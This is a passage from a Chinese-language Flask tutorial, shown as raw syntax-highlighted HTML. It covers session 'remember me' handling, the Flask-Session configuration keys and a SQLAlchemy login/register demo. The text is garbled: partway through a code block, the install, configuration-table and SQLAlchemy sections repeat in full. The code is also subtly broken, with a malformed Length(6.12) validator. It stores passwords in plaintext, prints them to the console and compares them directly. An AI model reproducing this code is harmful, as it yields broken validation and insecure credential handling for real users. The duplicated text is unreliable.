punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 判断复选框是否有值</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'remember'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>            session<span class="token punctuation">.</span>permanent <span class="token operator">=</span><span class="token boolean">True</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    login_html <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    &lt;form action="" method="POST">    &lt;p>&lt;input type=text name=username>&lt;/p>    &lt;p>&lt;input type=submit value=Login>&lt;/p>    &lt;label for="">7 days remember me&lt;/label>    &lt;input type="checkbox" name='remember' value="7 days remember me">    &lt;/form>    """</span>    <span class="token keyword">return</span>  login_html@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""删除 session"""</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span>None<span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-session存储在数据库中"><a href="#4-session存储在数据库中" class="headerlink" title="4.session存储在数据库中"></a>4.<code>session</code>存储在数据库中</h3><blockquote><p>虽然<code>Flask</code> 实现了<code>session</code> ,但是还是不能支持存储在数据库中.为什么要存储在数据库中,因为这样会更加安全.</p><p>这就需要一个新的插件<code>Flask-Session</code></p></blockquote><h2 id="Flask-Session"><a href="#Flask-Session" class="headerlink" title="Flask-Session"></a>Flask-Session</h2><blockquote><p>虽然<code>Flask</code> 自带的<code>session</code> 能够设置基本的信息,但是还是不能保存在服务器上,而且类似<code>cookie</code> 的作用域,和路径等等都不能设置.</p><p>这时候就需要使用<code>Flask</code> 的另外一个插件<code>Flask-Session</code>.</p></blockquote><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><blockquote><pre class="line-numbers language-bash">$ pip install flask-session</code></pre></blockquote><h3 id="2-基本配置"><a href="#2-基本配置" class="headerlink" title="2.基本配置"></a>2.基本配置</h3><blockquote><p><code>flask_session</code> 初始化后,会从<code>app.config</code> 中读取参数,它基本包括如下:</p><table><thead><tr><th><code>SESSION_COOKIE_NAME</code></th><th>设置返回给客户端的<code>cookie</code> 的名称,默认是<code>session</code></th></tr></thead><tbody><tr><td><code>SESSION_COOKIE_DOMAIN</code></td><td>设置<code>cookie</code>域.如果没有设置,默认对所有子域生效.</td></tr><tr><td><code>SESSION_COOKIE_PATH</code></td><td>设置<code>cookie</code> 路径,如果不设置,默认是<code>/</code></td></tr><tr><td><code>SESSION_COOKIE_HTTPONLY</code></td><td>默认为<code>True</code></td></tr><tr><td><code>SESSION_COOKIE_SECURE</code></td><td>默认为<code>False</code></td></tr><tr><td><code>SESSION_COOKIE_LIFETIME</code></td><td>生存期,值为<code>datetime.timedelta</code> 对象,需要设置<code>session.permanent =True</code></td></tr><tr><td><code>SESSION_TYPE</code></td><td>设置<code>session</code> 保存的位置:<br><code>=null</code> :使用<code>flask</code> 中默认<code>session</code><br><code>=redis</code> :保存在<code>redis</code><br><code>=memcache</code>:保存在<code>memcache</code>中<br><code>=filesystem</code>:保存在文件中<br><code>=mogodb</code>:保存在数据库中<br><code>=sqlalchemy</code>:保存在关系型数据库中</td></tr><tr><td><code>SESSION_PERMANENT</code></td><td>使用永久性会话,默认为<code>True</code></td></tr><tr><td><code>SESSION_USE_SIGNER</code></td><td>加密<code>session</code>,默认为<code>False</code>,设置为<code>True</code>,需要设置<code>SECRET_KEY</code></td></tr><tr><td><code>SESSION_KEY_PREFIX</code></td><td>在所有的会话键之前添加前缀,对于不同的应用程序可以使用不同的前缀.默认是<code>session</code>,即保存在<code>redis</code>中的键的名称都是以<code>session</code> 开头.</td></tr><tr><td><code>SESSION_REDIS</code></td><td><code>redis</code> 实例,默认为<code>127.0.0.1:6379</code></td></tr><tr><td><code>SESSION_MEMCACHED</code></td><td><code>memcache</code> 实例,默认为<code>127.0.0.1:11211</code></td></tr><tr><td><code>SESSION_FILE_DIR</code></td><td>文件存储目录.默认使用当前目录下的<code>flask_session</code>目录</td></tr><tr><td><code>SESSION_FILE_THRESHOLD</code></td><td>存储的最大项目数,默认为500</td></tr><tr><td><code>SESSION_FILE_MODE</code></td><td>文件模式,默认为<code>0600</code></td></tr><tr><td><code>SESSION_MONGODB</code></td><td><code>mongodb</code>实例,默认为<code>127.0.0.1:27017</code></td></tr><tr><td><code>SESSION_MONGODB_DB</code></td><td><code>mongodb</code>数据库的<code>SCHEME</code>,默认是<code>flask_session</code></td></tr><tr><td><code>SESSION_MONGODB_COLLECT</code></td><td><code>mongodb</code>集合,默认是<code>sessions</code></td></tr><tr><td><code>SESSION_SQLALCHEMY</code></td><td>一个<code>flask.ext.sqlalchemy.SQLAlchemy</code>实例，其实例使用<code>SQLALCHEMY_DATABASE_URI</code>参数配置了数据库连接<code>URI</code></td></tr><tr><td><code>SESSION_SQLALCHEMY_TABLE</code></td><td>要使用的<code>SQL</code>表的名称,默认是<code>sessions</code></td></tr></tbody></table><p>基本上只需要配置<code>SESSION_TYPE</code></p></blockquote><h3 id="3-使用SQLAlchemy"><a href="#3-使用SQLAlchemy" class="headerlink" title="3.使用SQLAlchemy"></a>3.使用SQLAlchemy</h3><blockquote><p>结合以前的知识,做一个汇总.</p><p>参考<code>https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T20</code></p></blockquote><h4 id="1-创建exts"><a href="#1-创建exts" class="headerlink" title="1.创建exts"></a>1.创建<code>exts</code></h4><blockquote><pre><code class="python"><code class="language-bash">$ pip install flask-session</code></pre></blockquote><h3 id="2-基本配置"><a href="#2-基本配置" class="headerlink" title="2.基本配置"></a>2.基本配置</h3><blockquote><p><code>flask_session</code> 初始化后,会从<code>app.config</code> 中读取参数,它基本包括如下:</p><table><thead><tr><th><code>SESSION_COOKIE_NAME</code></th><th>设置返回给客户端的<code>cookie</code> 的名称,默认是<code>session</code></th></tr></thead><tbody><tr><td><code>SESSION_COOKIE_DOMAIN</code></td><td>设置<code>cookie</code>域.如果没有设置,默认对所有子域生效.</td></tr><tr><td><code>SESSION_COOKIE_PATH</code></td><td>设置<code>cookie</code> 路径,如果不设置,默认是<code>/</code></td></tr><tr><td><code>SESSION_COOKIE_HTTPONLY</code></td><td>默认为<code>True</code></td></tr><tr><td><code>SESSION_COOKIE_SECURE</code></td><td>默认为<code>False</code></td></tr><tr><td><code>SESSION_COOKIE_LIFETIME</code></td><td>生存期,值为<code>datetime.timedelta</code> 对象,需要设置<code>session.permanent =True</code></td></tr><tr><td><code>SESSION_TYPE</code></td><td>设置<code>session</code> 保存的位置:<br><code>=null</code> :使用<code>flask</code> 中默认<code>session</code><br><code>=redis</code> :保存在<code>redis</code><br><code>=memcache</code>:保存在<code>memcache</code>中<br><code>=filesystem</code>:保存在文件中<br><code>=mogodb</code>:保存在数据库中<br><code>=sqlalchemy</code>:保存在关系型数据库中</td></tr><tr><td><code>SESSION_PERMANENT</code></td><td>使用永久性会话,默认为<code>True</code></td></tr><tr><td><code>SESSION_USE_SIGNER</code></td><td>加密<code>session</code>,默认为<code>False</code>,设置为<code>True</code>,需要设置<code>SECRET_KEY</code></td></tr><tr><td><code>SESSION_KEY_PREFIX</code></td><td>在所有的会话键之前添加前缀,对于不同的应用程序可以使用不同的前缀.默认是<code>session</code>,即保存在<code>redis</code>中的键的名称都是以<code>session</code> 开头.</td></tr><tr><td><code>SESSION_REDIS</code></td><td><code>redis</code> 实例,默认为<code>127.0.0.1:6379</code></td></tr><tr><td><code>SESSION_MEMCACHED</code></td><td><code>memcache</code> 实例,默认为<code>127.0.0.1:11211</code></td></tr><tr><td><code>SESSION_FILE_DIR</code></td><td>文件存储目录.默认使用当前目录下的<code>flask_session</code>目录</td></tr><tr><td><code>SESSION_FILE_THRESHOLD</code></td><td>存储的最大项目数,默认为500</td></tr><tr><td><code>SESSION_FILE_MODE</code></td><td>文件模式,默认为<code>0600</code></td></tr><tr><td><code>SESSION_MONGODB</code></td><td><code>mongodb</code>实例,默认为<code>127.0.0.1:27017</code></td></tr><tr><td><code>SESSION_MONGODB_DB</code></td><td><code>mongodb</code>数据库的<code>SCHEME</code>,默认是<code>flask_session</code></td></tr><tr><td><code>SESSION_MONGODB_COLLECT</code></td><td><code>mongodb</code>集合,默认是<code>sessions</code></td></tr><tr><td><code>SESSION_SQLALCHEMY</code></td><td>一个<code>flask.ext.sqlalchemy.SQLAlchemy</code>实例，其实例使用<code>SQLALCHEMY_DATABASE_URI</code>参数配置了数据库连接<code>URI</code></td></tr><tr><td><code>SESSION_SQLALCHEMY_TABLE</code></td><td>要使用的<code>SQL</code>表的名称,默认是<code>sessions</code></td></tr></tbody></table><p>基本上只需要配置<code>SESSION_TYPE</code></p></blockquote><h3 id="3-使用SQLAlchemy"><a href="#3-使用SQLAlchemy" class="headerlink" title="3.使用SQLAlchemy"></a>3.使用SQLAlchemy</h3><blockquote><p>结合以前的知识,做一个汇总.</p><p>参考<code>https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T20</code></p></blockquote><h4 id="1-创建exts"><a href="#1-创建exts" class="headerlink" title="1.创建exts"></a>1.创建<code>exts</code></h4><blockquote><pre><code class="python"># extsfrom flask_sqlalchemy import SQLAlchemydb = SQLAlchemy()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-创建login-html-register-html"><a href="#2-创建login-html-register-html" class="headerlink" title="2.创建login.html\register.html"></a>2.创建<code>login.html\register.html</code></h4><blockquote><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>30 days remember me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>remember<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>repeat password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>reppassword<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        {{ msg }}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-创建Form表单验证"><a href="#3-创建Form表单验证" class="headerlink" title="3.创建Form表单验证"></a>3.创建<code>Form</code>表单验证</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># formModel.py</span><span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm<span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token punctuation">,</span> BooleanField<span class="token punctuation">,</span>IntegerField<span class="token punctuation">,</span>PasswordField<span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> Length<span class="token punctuation">,</span>EqualTo<span class="token keyword">class</span> <span class="token class-name">LoginForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">6.12</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    remember <span class="token operator">=</span> BooleanField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">RegisterForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">6.12</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    reppassword <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>EqualTo<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="4-创建数据库映射"><a href="#4-创建数据库映射" class="headerlink" title="4.创建数据库映射"></a>4.创建数据库映射</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># dbModel.py</span><span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'user'</span>    id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    remember <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Boolean<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="5-创建app-py"><a href="#5-创建app-py" class="headerlink" title="5.创建app.py"></a>5.创建<code>app.py</code></h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">import</span> config<span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>session<span class="token keyword">from</span> formModel <span class="token keyword">import</span> LoginForm<span class="token punctuation">,</span>RegisterForm<span class="token keyword">from</span> dbModel <span class="token keyword">import</span> User<span class="token keyword">from</span> flask_session <span class="token keyword">import</span> Session <span class="token keyword">as</span> Fsession<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedeltaapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 初始化db</span>db<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span>Fsession<span class="token punctuation">(</span>app<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'You are not log in &lt;a href="/login/">Login&lt;a>'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        user <span class="token operator">=</span> form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data        passwd <span class="token operator">=</span> form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data        remember <span class="token operator">=</span> form<span class="token punctuation">.</span>remember<span class="token punctuation">.</span>data        <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> passwd<span class="token punctuation">,</span> remember<span class="token punctuation">,</span> type<span class="token punctuation">(</span>remember<span class="token punctuation">)</span><span class="token punctuation">)</span>        patt <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>username <span class="token operator">==</span> user<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>         dpaassword <span class="token operator">=</span> <span class="token string">""</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> patt<span class="token punctuation">:</span>            dpaassword <span class="token operator">=</span> i        <span class="token keyword">if</span> patt <span class="token operator">and</span> dpaassword <span class="token operator">==</span> passwd<span class="token punctuation">:</span>            <span class="token comment" 